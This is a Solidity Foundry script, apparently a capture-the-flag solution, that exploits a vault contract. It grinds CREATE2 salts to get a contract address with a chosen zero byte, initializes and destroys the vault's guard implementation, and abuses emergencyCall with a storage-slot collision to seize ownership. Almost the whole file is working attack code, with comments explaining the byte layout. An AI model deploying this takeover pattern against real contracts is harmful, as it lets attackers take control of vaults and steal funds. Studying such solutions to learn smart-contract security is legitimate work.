// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IGuardRegistry {
    function defaultImplementation() external view returns (bytes32);

    function implementations(
        bytes32 implementationId
    ) external view returns (address);
}

interface IVault {
    function guard() external view returns (address);

    function emergencyCall(address target, bytes memory data) external;

    function checkAccess(string memory op) external returns (bool);
}

interface ISetupVault {
    function registry() external view returns (IGuardRegistry);

    function vault() external view returns (IVault);
}

contract ExploitScript is Script {
    VaultExploit public vaultExploit;
    ISetupVault public constant VAULT_SETUP =
        ISetupVault(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
    IGuardRegistry public registry;

    function setUp() public {}

    function run() public {
        vm.startBroadcast(
            0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6
        );

        registry = ISetupVault(VAULT_SETUP).registry();

        for (uint256 i = 0; i < type(uint16).max; ) {
            VaultExploit x;
            x = new VaultExploit{salt: keccak256(abi.encode(i))}(
                registry.implementations(registry.defaultImplementation()),
                address(VAULT_SETUP.vault())
            );

            if (
                bytes32((uint256(uint160(address(x))) << 216) >> 248) ==
                bytes32(0)
            ) {
                vaultExploit = x;
                break;
            }

            unchecked {
                ++i;
            }
        }

        vaultExploit.initAttack();

        vm.stopBroadcast();
    }

    function complete() public {
        VaultExploit(0xA9CDA8cfCC9caF2d52a02eeDF460b60029b1C407).execAttack();
    }
}

interface ISingleOwnerGuard {
    function initialize(address vault) external;

    function cleanup() external;

    function isAllowed(
        address who,
        string memory op
    ) external view returns (uint8, uint8);
}

contract VaultExploit {
    // @audit-info:                                                 STORAGE LAYOUT
    address public owner; //                                                  0x00 (corresponds to `owner` slot in `Vault` contract)
    ISingleOwnerGuard public guardImplementation; //                          0x01
    IVault private vault; //                                                  0x02

    constructor(address singleOwnerGuardImplementation, address liveVault) {
        owner = msg.sender;
        guardImplementation = ISingleOwnerGuard(singleOwnerGuardImplementation);
        vault = IVault(liveVault);
    }

    function guard() external view returns (address) {
        return address(guardImplementation);
    }

    function initAttack() external {
        guardImplementation.initialize(address(this));
        guardImplementation.cleanup();
    }

    function execAttack() external {
        //                                                 |<< ----------- emergencyCall() `msg.sender` ---------- >>|
        // b9 46 06 32 00 00 00 00 00 00 00 00 00 00 00 00 a0 Ee 7A 14 2d 26 7C 1f 36 71 4E 4a 8F 75 61 2F 20 a7 97 20
        // |<< --------------------------------------- 32 bytes -------------------------------------- >>|
        // `2F` - 16th byte of emergencyCall() `msg.sender` -- address(this) -- has to be `00`
        // therefore, `create2` opcode will be used to find a match by randomizing `salt` offchain
        vault.emergencyCall(
            address(this),
            abi.encodeWithSignature("changeProxyOwner(address)", owner)
        );
    }

    function changeProxyOwner(address to) external {
        owner = to;
    }
}
